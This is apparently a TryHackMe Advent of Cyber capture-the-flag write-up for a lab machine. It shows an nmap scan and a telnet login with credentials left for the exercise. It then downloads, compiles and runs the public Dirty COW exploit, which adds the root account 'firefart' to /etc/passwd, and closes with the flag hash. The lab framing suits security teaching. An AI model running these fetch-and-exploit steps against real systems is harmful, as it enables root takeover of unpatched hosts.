# TRYHACKME: ADVENTOFCYBER2 [DAY 13] SPECIAL - Coal for Christmas

```
Prove these sysadmins deserve coal for Christmas!
```

TOPICS: dirty cow

### QUESTIONS

What old, deprecated protocol and service is running?

```
$ nmap 10.10.102.162                           
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 17:10 EST
Nmap scan report for 10.10.102.162
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
23/tcp  open  telnet
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
```

Connect to this service to see if you can make use of it. You can connect to the service with the standard command-line client, named after the name of the service, or netcat. What credential was left for you?

```
$ telnet 10.10.102.162                                                                                     130 ⨯
Trying 10.10.102.162...
Connected to 10.10.102.162.
Escape character is '^]'.
HI SANTA!!! 

We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account for you to use.

Username: santa
Password: clauschristmas

We left you cookies and milk!

christmas login: santa
Password: 
Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2
                \ / 
              -->*<-- 
                /o\ 
               /_\_\ 
              /_/_0_\ 
             /_o_\_\_\ 
            /_/_/_/_/o\ 
           /@\_\_\@\_\_\ 
          /_/_/O/_/_/_/_\ 
         /_\_\_\_\_\o\_\_\ 
        /_/0/_/_/_0_/_/@/_\ 
       /_\_\_\_\_\_\_\_\_\_\ 
      /_/o/_/_/@/_/_/o/_/0/_\ 
               [___] 
```

What distribution of Linux and version number is this server running?

```
$ cat lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
```

Who got here first?

```
$ cat cookies_and_milk.txt
/*************************************************
// HAHA! Too bad Santa! I, the Grinch, got here 
// before you did! I helped myself to some of
// the goodies here, but you can still enjoy
// some half eaten cookies and this leftover
// milk! Why dont you try and refill it yourself!
//   - Yours Truly,
//         The Grinch
//*************************************************/

```

What is the verbatim syntax you can use to compile, taken from the real C source code comments?

```
$ wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
$ python3 -m http.server 8080
$ wget 10.6.44.43:8080/dirty.c

$ gcc -pthread dirty.c -o dirty -lcrypt
```

What "new" username was created, with the default operations of the real C source code?

```
$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiIoY9ux7Hzpc:0:0:pwned:/root:/bin/bash

mmap: 7f844d312000
```

Uh oh, looks like that perpetrator left a message! Follow his instructions to prove you really did leave Coal for Christmas!  After you leave behind the coal, you can `run tree | md5sum`. What is the MD5 hash output?

```
 su firefart
Password: 
firefart@christmas:/home/santa# cd /root
firefart@christmas:~# ls
christmas.sh  message_from_the_grinch.txt
firefart@christmas:~# cat message_from_the_grinch.txt
Nice work, Santa!

Wow, this house sure was DIRTY!
I think they deserve coal for Christmas, don't you?
So let's leave some coal under the Christmas `tree`!

Let's work together on this. Leave this text file here,
and leave the christmas.sh script here too...
but, create a file named `coal` in this directory!
Then, inside this directory, pipe the output
of the `tree` command into the `md5sum` command.

The output of that command (the hash itself) is
the flag you can submit to complete this task
for the Advent of Cyber!

        - Yours,
                John Hammond
                er, sorry, I mean, the Grinch

          - THE GRINCH, SERIOUSLY

firefart@christmas:~# touch coal
firefart@christmas:~# tree
.
|-- christmas.sh
|-- coal
`-- message_from_the_grinch.txt

0 directories, 3 files
firefart@christmas:~# tree | md5sum
8b16f00dd3b51efadb02c1df7f8427cc  -
```
